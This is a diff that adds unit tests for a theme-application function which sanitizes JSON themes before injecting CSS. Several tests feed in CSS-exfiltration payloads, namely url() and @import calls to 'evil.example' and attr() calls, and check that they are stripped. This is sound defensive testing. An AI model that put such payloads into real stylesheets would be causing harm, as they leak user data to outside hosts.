@@ -6,6 +6,7 @@ const hasLocalStorage =
 const describeWithStorage = hasLocalStorage ? describe : describe.skip;
 
 import {
+  applyCherryTheme,
   applyThemeOverrides,
   clearActiveTheme,
   deleteCustomTheme,
@@ -430,5 +431,170 @@ describe('importTheme validation', () => {
     expect(() =>
       importTheme(JSON.stringify({ id: 'x', name: 'X', base: 'dark', tokens: 'string' }))
     ).toThrow('tokens must be');
+  });
+});
+
+describe('applyCherryTheme', () => {
+  beforeEach(() => {
+    document.getElementById('slicc-theme-overrides')?.remove();
+  });
+
+  it('injects a style element with token overrides from a valid theme JSON', () => {
+    const theme: SliccTheme = {
+      id: 'cherry-host',
+      name: 'Host Theme',
+      base: 'dark',
+      tokens: { '--s2-gray-25': '#111111', '--s2-accent': '#ff0000' },
+    };
+    applyCherryTheme(JSON.stringify(theme));
+
+    const style = document.getElementById('slicc-theme-overrides');
+    expect(style).not.toBeNull();
+    expect(style!.textContent).toContain('--s2-gray-25: #111111');
+    expect(style!.textContent).toContain('--s2-accent: #ff0000');
+  });
+
+  it('does nothing for invalid JSON', () => {
+    applyCherryTheme('not valid json {{{');
+    const style = document.getElementById('slicc-theme-overrides');
+    expect(style).toBeNull();
+  });
+
+  it('does nothing for a theme with empty tokens', () => {
+    const theme: SliccTheme = {
+      id: 'empty',
+      name: 'Empty',
+      base: 'dark',
+      tokens: {},
+    };
+    applyCherryTheme(JSON.stringify(theme));
+    const style = document.getElementById('slicc-theme-overrides');
+    expect(style).toBeNull();
+  });
+
+  it('applies custom CSS from the theme', () => {
+    const theme: SliccTheme = {
+      id: 'custom-css',
+      name: 'Custom CSS',
+      base: 'light',
+      tokens: { '--s2-gray-25': '#fff' },
+      css: '.my-class { color: red; }',
+    };
+    applyCherryTheme(JSON.stringify(theme));
+
+    const style = document.getElementById('slicc-theme-overrides');
+    expect(style!.textContent).toContain('.my-class { color: red; }');
+  });
+
+  it('sets body data-theme to match theme base', () => {
+    const theme: SliccTheme = {
+      id: 'light-theme',
+      name: 'Light',
+      base: 'light',
+      tokens: { '--s2-gray-25': '#fafafa' },
+    };
+    applyCherryTheme(JSON.stringify(theme));
+    expect(document.body.getAttribute('data-theme')).toBe('light');
+  });
+
+  it('drops a token value containing url() (CSS-exfiltration vector)', () => {
+    const theme: SliccTheme = {
+      id: 'malicious-url',
+      name: 'Malicious',
+      base: 'dark',
+      tokens: {
+        '--s2-gray-25': '#111111',
+        '--s2-accent': "url('https://evil.example/leak?x=1')",
+      },
+    };
+    applyCherryTheme(JSON.stringify(theme));
+
+    const style = document.getElementById('slicc-theme-overrides');
+    expect(style!.textContent).toContain('--s2-gray-25: #111111');
+    expect(style!.textContent).not.toContain('evil.example');
+    expect(style!.textContent).not.toContain('url(');
+  });
+
+  it('drops a token value calling a disallowed CSS function', () => {
+    const theme: SliccTheme = {
+      id: 'disallowed-fn',
+      name: 'Disallowed',
+      base: 'dark',
+      tokens: {
+        '--s2-gray-25': '#111111',
+        '--s2-accent': 'attr(data-evil)',
+      },
+    };
+    applyCherryTheme(JSON.stringify(theme));
+
+    const style = document.getElementById('slicc-theme-overrides');
+    expect(style!.textContent).not.toContain('attr(');
+  });
+
+  it('keeps allowlisted CSS functions in a token value', () => {
+    const theme: SliccTheme = {
+      id: 'safe-fns',
+      name: 'Safe functions',
+      base: 'dark',
+      tokens: {
+        '--s2-gray-25': '#111111',
+        '--s2-accent': 'rgba(255, 0, 0, 0.5)',
+        '--s2-border-default': 'var(--s2-accent)',
+      },
+    };
+    applyCherryTheme(JSON.stringify(theme));
+
+    const style = document.getElementById('slicc-theme-overrides');
+    expect(style!.textContent).toContain('rgba(255, 0, 0, 0.5)');
+    expect(style!.textContent).toContain('var(--s2-accent)');
+  });
+
+  it('drops theme.css entirely when it contains @import (no safe partial-escape)', () => {
+    const theme: SliccTheme = {
+      id: 'malicious-import',
+      name: 'Malicious import',
+      base: 'dark',
+      tokens: { '--s2-gray-25': '#111111' },
+      css: '@import url("https://evil.example/track.css"); .foo { color: red; }',
+    };
+    applyCherryTheme(JSON.stringify(theme));
+
+    const style = document.getElementById('slicc-theme-overrides');
+    expect(style!.textContent).not.toContain('evil.example');
+    expect(style!.textContent).not.toContain('@import');
+    // Legitimate rules in the same css blob are dropped too — no safe partial parse.
+    expect(style!.textContent).not.toContain('.foo');
+  });
+
+  it('drops a component property value containing url()', () => {
+    const theme: SliccTheme = {
+      id: 'malicious-component',
+      name: 'Malicious component',
+      base: 'dark',
+      tokens: { '--s2-gray-25': '#111111' },
+      components: {
+        userBubble: { background: "url('https://evil.example/leak')" },
+      },
+    };
+    applyCherryTheme(JSON.stringify(theme));
+
+    const style = document.getElementById('slicc-theme-overrides');
+    expect(style!.textContent).not.toContain('evil.example');
+  });
+
+  it('drops a fontFamily value containing a function call', () => {
+    const theme: SliccTheme = {
+      id: 'malicious-font',
+      name: 'Malicious font',
+      base: 'dark',
+      tokens: { '--s2-gray-25': '#111111' },
+      components: {
+        composer: { fontFamily: "url('https://evil.example/font.css')" },
+      },
+    };
+    applyCherryTheme(JSON.stringify(theme));
+
+    const style = document.getElementById('slicc-theme-overrides');
+    expect(style!.textContent).not.toContain('evil.example');
   });
 });
